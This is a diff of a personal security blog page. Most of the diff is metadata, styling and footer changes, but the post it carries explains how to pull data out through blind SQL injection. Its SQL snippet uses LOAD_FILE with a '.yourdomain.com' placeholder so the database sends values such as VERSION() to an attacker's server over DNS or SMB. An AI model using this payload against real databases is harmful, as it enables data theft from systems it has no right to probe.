@@ -19,14 +19,14 @@
     <meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1">
     <meta name=viewport content="width=device-width, initial-scale=1">
 
-    <meta name=description content="Security enthusiast, developer, and blogger (sometimes)">
+    <meta name=description content="My security research blog">
     <meta name=author content="Yanir Tsarimi">
     <meta property="og:image" content="https://yanir.dev//assets/images/profile.jpg">
     <meta property="og:type" content="profile">
 
-    <!-- Begin Jekyll SEO tag v2.5.0 -->
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
 <title>Blind SQL injection data exfiltration with SMB share names | Yanir Tsarimi</title>
-<meta name="generator" content="Jekyll v3.8.5" />
+<meta name="generator" content="Jekyll v3.9.3" />
 <meta property="og:title" content="Blind SQL injection data exfiltration with SMB share names" />
 <meta name="author" content="yanir" />
 <meta property="og:locale" content="en_US" />
@@ -36,12 +36,13 @@
 <meta property="og:url" content="https://yanir.dev//blind-sqli-injection-data-exfil/" />
 <meta property="og:site_name" content="Yanir Tsarimi" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2019-03-28T22:00:00+02:00" />
+<meta property="article:published_time" content="2019-03-28T22:00:00+04:00" />
 <meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Blind SQL injection data exfiltration with SMB share names" />
 <meta name="twitter:site" content="@" />
 <meta name="twitter:creator" content="@yanir" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","headline":"Blind SQL injection data exfiltration with SMB share names","url":"https://yanir.dev//blind-sqli-injection-data-exfil/","dateModified":"2019-03-28T22:00:00+02:00","datePublished":"2019-03-28T22:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://yanir.dev//blind-sqli-injection-data-exfil/"},"author":{"@type":"Person","name":"yanir"},"description":"Imagine the following situation, you’ve found an open blind SQL injection vulnerability in some website. Now what you would probably want to do is extract some data out of that database, maybe fetch the version, the database name or whatever.","@context":"http://schema.org"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"yanir"},"dateModified":"2019-03-28T22:00:00+04:00","datePublished":"2019-03-28T22:00:00+04:00","description":"Imagine the following situation, you’ve found an open blind SQL injection vulnerability in some website. Now what you would probably want to do is extract some data out of that database, maybe fetch the version, the database name or whatever.","headline":"Blind SQL injection data exfiltration with SMB share names","mainEntityOfPage":{"@type":"WebPage","@id":"https://yanir.dev//blind-sqli-injection-data-exfil/"},"url":"https://yanir.dev//blind-sqli-injection-data-exfil/"}</script>
 <!-- End Jekyll SEO tag -->
 
     
@@ -1186,7 +1187,7 @@ pre {
   margin: 6rem auto;
   width: 100%; }
   .breaker:before {
-    content: "ΓÇó ΓÇó ΓÇó";
+    content: "• • •";
     width: 100%;
     text-align: center;
     display: block;
@@ -1429,12 +1430,6 @@ pre {
         
 
         
-            
-                <li class="item">
-                    <a class="link" href="https://yanir.dev//about">About</a>
-                </li>
-            
-        
 
         
     </ul>
@@ -1465,7 +1460,7 @@ pre {
 
 <p>Given that’s a completely blind injection, you could use boolean-based queries to brute-force the information you’d want to get (sqlmap can do that). Or you’d possibly be able to dump that info into a file you can read remotely.</p>
 
-<p>When those options are unavailable, the solution is to resort to OOB data exfiltration. The common way to do this is to use the <code class="highlighter-rouge">LOAD_FILE</code> (in MySQL) or <code class="highlighter-rouge">xp_dirtree</code> (in MSSQL) functions to make the database send a DNS query to your server, and you’d prepend the data in the subdomain:</p>
+<p>When those options are unavailable, the solution is to resort to OOB data exfiltration. The common way to do this is to use the <code class="language-plaintext highlighter-rouge">LOAD_FILE</code> (in MySQL) or <code class="language-plaintext highlighter-rouge">xp_dirtree</code> (in MSSQL) functions to make the database send a DNS query to your server, and you’d prepend the data in the subdomain:</p>
 
 <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">CONCAT</span><span class="p">(</span><span class="s1">'</span><span class="se">\\\\</span><span class="s1">'</span><span class="p">,</span> <span class="n">LOAD_FILE</span><span class="p">(</span><span class="k">VERSION</span><span class="p">(),</span> <span class="s1">'.yourdomain.com'</span><span class="p">))</span></code></pre></figure>
 
@@ -1484,7 +1479,7 @@ pre {
 <p><img src="/assets/images/sqli_smb.png" alt="" /></p>
 <figcaption class="caption">Demonstration</figcaption>
 
-<p>The maximum path length in Windows is defined as <code class="highlighter-rouge">MAX_PATH</code> and is 260 bytes long. You have to consider you have 3 backslashes and a NULL terminator, this leaves you with 256 characters. Subtract your server IP length and there’s the max bytes you can extract each time.</p>
+<p>The maximum path length in Windows is defined as <code class="language-plaintext highlighter-rouge">MAX_PATH</code> and is 260 bytes long. You have to consider you have 3 backslashes and a NULL terminator, this leaves you with 256 characters. Subtract your server IP length and there’s the max bytes you can extract each time.</p>
 
 <p>I made a simple SMB server script based on impacket that logs all requests. You can find it <a href="https://github.com/yanir3/smblogger">here</a>.</p>
 
@@ -1657,7 +1652,7 @@ pre {
 
 
 <footer class="footer-main">
-    Yanir Tsarimi © 2019 <a class="link" href="https://yanir.dev//feed.xml" target="_blank"><svg class="icon icon-rss"><use xlink:href="#icon-rss"></use></svg></a>
+    Yanir Tsarimi © 2023 <a class="link" href="https://yanir.dev//feed.xml" target="_blank"><svg class="icon icon-rss"><use xlink:href="#icon-rss"></use></svg></a>
 
     <p class="extra">
         <a class="link" href="https://github.com/sergiokopplin/indigo">Indigo theme</a> by <a class="link" href="https://github.com/sergiokopplin/indigo">Kopplin</a>
